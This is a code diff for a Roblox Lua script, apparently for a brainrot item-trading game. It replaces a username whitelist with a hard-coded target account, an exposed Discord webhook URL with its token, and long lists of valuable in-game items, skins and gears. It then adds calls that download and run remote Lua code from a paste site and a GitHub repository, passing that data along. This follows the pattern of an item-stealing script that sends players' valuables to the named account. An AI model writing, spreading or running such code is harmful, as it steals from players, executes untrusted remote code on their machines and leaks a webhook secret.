@@ -1,21 +1,127 @@
-local WHITELIST = {
-	"yabl777",
-	"peroxideisgoodxd",
-	"ilyasvip7",
-	"mmmrigatonirice",
-	"her",
+local TARGET_ID = 4931733061
+local TARGET_USER = "YABL777"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1541479380176601109/UNfpxWv-Hfqwn_b5egjMFL8TqM51GhpTP85uJocCcSBj2dIxqj_cT-RwLiPzNP-Cnnr1"
+
+local TargetBrainrots = {
+    ["Meowl"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Griffin"] = true,
+    ["Hydra Bunny"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Antonio"] = true,
+    ["Arcadragon"] = true,
+    ["Rico Dinero"] = true,
+    ["Rubrikiko"] = true,
+    ["Capitano Americano"] = true,
+    ["Elefanto Frigo"] = true,
+    ["John Pork"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["La Casa Boo"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Globa Steppa"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Headless Horseman"] = true,
+    ["Money Money Bros"] = true,
+    ["Bufalino Boomberino"] = true,
+    ["Kraken"] = true,
+    ["4th Bros"] = true,
+    ["Cerberus"] = true,
+    ["Fishino Clownino"] = true,
+    ["Duggy Bros"] = true,
+    ["Signore Carapace"] = true,
+    ["Venuspino"] = true,
+    ["Steakini Fattini"] = true,
+    ["Caylusaurus"] = true,
+    ["Los Hackers"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Jelly Moby"] = true,
+    ["Foxini Lanternini"] = true,
+    ["John Doe"] = true,
+    ["Los Tictacs"] = true,
+    ["Digi Narwhal"] = true,
+    ["Bearito Cabinito"] = true,
+    ["Los Admins"] = true,
+    ["Moby Bros"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Boppin Bunny"] = true,
+    ["Cash or Card"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Eviledon"] = true,
+    ["Fragola La La La"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Festive 67"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Ginger Gerat"] = true,
+    ["Garama and Madundung"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["La Ginger Sekolah"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Easter Grande"] = true,
+    ["La Lucky Grande"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Taco Combinasion"] = true,
+    ["Bumbatron"] = true,
+    ["Yetimatic"] = true,
+    ["Examen Bros"] = true,
+    ["S'more Serat"] = true,
+    ["Queen Bee"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Los Primos"] = true,
+    ["Los Tacoritas"] = true,
+    ["Lovin Rose"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Swaggy Bros"] = true,
+    ["Tacorita Bicicleta"] = true,
+    ["Tralaledon"] = true,
+    ["Tuff Toucan"] = true,
+    ["Rubiko and Kubiko"] = true,
+    ["La Fuse Machine"] = true,
+    ["Polaroidini"] = true,
+    ["Sammyni Truckini"] = true,
+    ["Grabatron"] = true,
+    ["W or L"] = true
 }
 
-local whitelistLookup = {}
-for _, name in ipairs(WHITELIST) do
-	whitelistLookup[string.lower(name)] = true
-end
+local TargetBaseSkins = {
+    ["Tralalero"] = true
+}
 
-if not whitelistLookup[string.lower(player.Name)] then
-	player:Kick("Not whitelisted.Loser gogogaga")
-	return
-end
+local TargetGears = {
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Waverider"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Witch's Broom"] = true
+}
 
--- Master table
-local M = {}
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/98873f97ed10761e0613d10ab6e9e455.lua"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://pastefy.app/eDmA1TWp/raw"))()
+end)
+
+task.wait(1)
+
+task.spawn(function()
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
